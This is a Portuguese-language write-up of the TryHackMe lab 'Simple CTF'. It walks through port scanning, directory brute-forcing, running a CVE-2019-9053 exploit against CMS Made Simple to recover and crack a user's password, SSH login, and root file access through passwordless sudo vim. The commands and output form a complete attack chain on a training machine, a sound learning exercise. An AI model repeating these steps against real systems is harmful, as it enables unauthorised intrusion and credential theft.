---
title: 'TryHackMe: Simple CTF'
author: Kertonli
categories: [TryHackMe]
tags: [Fácil, Rustscan, Nmap, Feroxbuster, Cve, Ssh, Privilege Scalation]
image:
  path: assets/images/tryhackme/simplectf/room.png
---

# Alvo

10.10.32.37

# Rustscan + Nmap

```
rustscan -a 10.10.32.37 -- -A -sC -sV
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.32.37:21
Open 10.10.32.37:80
Open 10.10.32.37:2222



[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -A -sC -sV" on ip 10.10.32.37
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-23 13:09 EST

Discovered open port 80/tcp on 10.10.32.37
Discovered open port 21/tcp on 10.10.32.37
Discovered open port 2222/tcp on 10.10.32.37
Completed SYN Stealth Scan at 13:09, 0.30s elapsed (3 total ports)
Initiating Service scan at 13:09
Scanning 3 services on 10.10.32.37
Completed Service scan at 13:09, 6.51s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.32.37
Retrying OS detection (try #2) against 10.10.32.37
Initiating Traceroute at 13:10
Completed Traceroute at 13:10, 0.32s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 13:10
Completed Parallel DNS resolution of 2 hosts. at 13:10, 0.03s elapsed
DNS resolution of 2 IPs took 0.03s. Mode: Async [#: 2, OK: 0, NX: 2, DR: 0, SF: 0, TR: 2, CN: 0]
NSE: Script scanning 10.10.32.37.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:10
NSE: [ftp-bounce 10.10.32.37:21] PORT response: 500 Illegal PORT command.
NSE Timing: About 99.76% done; ETC: 13:10 (0:00:00 remaining)
Completed NSE at 13:10, 31.90s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 1.93s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Nmap scan report for 10.10.32.37
Host is up, received reset ttl 63 (0.27s latency).
Scanned at 2025-02-23 13:09:47 EST for 48s

PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.44.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
2222/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCj5RwZ5K4QU12jUD81IxGPdEmWFigjRwFNM2pVBCiIPWiMb+R82pdw5dQPFY0JjjicSysFN3pl8ea2L8acocd/7zWke6ce50tpHaDs8OdBYLfpkh+OzAsDwVWSslgKQ7rbi/ck1FF1LIgY7UQdo5FWiTMap7vFnsT/WHL3HcG5Q+el4glnO4xfMMvbRar5WZd4N0ZmcwORyXrEKvulWTOBLcoMGui95Xy7XKCkvpS9RCpJgsuNZ/oau9cdRs0gDoDLTW4S7OI9Nl5obm433k+7YwFeoLnuZnCzegEhgq/bpMo+fXTb/4ILI5bJHJQItH2Ae26iMhJjlFsMqQw0FzLf
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM6Q8K/lDR5QuGRzgfrQSDPYBEBcJ+/2YolisuiGuNIF+1FPOweJy9esTtstZkG3LPhwRDggCp4BP+Gmc92I3eY=
|   256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2I73yryK/Q6UFyvBBMUJEfznlIdBXfnrEqQ3lWdymK
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): Linux 3.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:5.4 cpe:/h:hp:p2000_g3
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (86%), Linux 5.4 (85%), HP P2000 G3 NAS device (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=2/23%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=67BB649B%P=x86_64-pc-linux-gnu)
SEQ(SP=100%GCD=1%ISR=10A%TI=Z%II=I%TS=A)
SEQ(SP=101%GCD=1%ISR=10B%TI=Z%II=I%TS=A)
OPS(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%TG=40%W=6903%O=M508NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 41.425 days (since Mon Jan 13 02:58:39 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   304.26 ms 10.8.0.1
2   306.63 ms 10.10.32.37

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:10
Completed NSE at 13:10, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.71 seconds
           Raw packets sent: 85 (7.288KB) | Rcvd: 35 (2.200KB)

```

# Feroxbuster

a saída é um monte de rotas começando com /simple.

```
feroxbuster -u http://10.10.32.37 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

Acessando o site já descobrimos a versão: CMS Made Simple version 2.2.8

# CVE-2019-9053

Baixando o arquivo python, ajustando para que funcione e executando com os comandos necessários

```

python2 cve.py -u http://10.10.32.37/simple --crack -w /usr/share/wordlists/rockyou.txt


[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
                                                                    

```

# SSH

```
ssh -p 2222 mitch@10.10.32.37
The authenticity of host '[10.10.32.37]:2222 ([10.10.32.37]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.32.37]:2222' (ED25519) to the list of known hosts.
mitch@10.10.32.37's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!

```

# Privilege Scalation

```

sudo -l -l
User mitch may run the following commands on Machine:

Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
        /usr/bin/vim

Posso executar vim como sudo.

sudo /usr/bin/vim /root/root.txt

```

![alt text](assets/images/tryhackme/simplectf/image.png)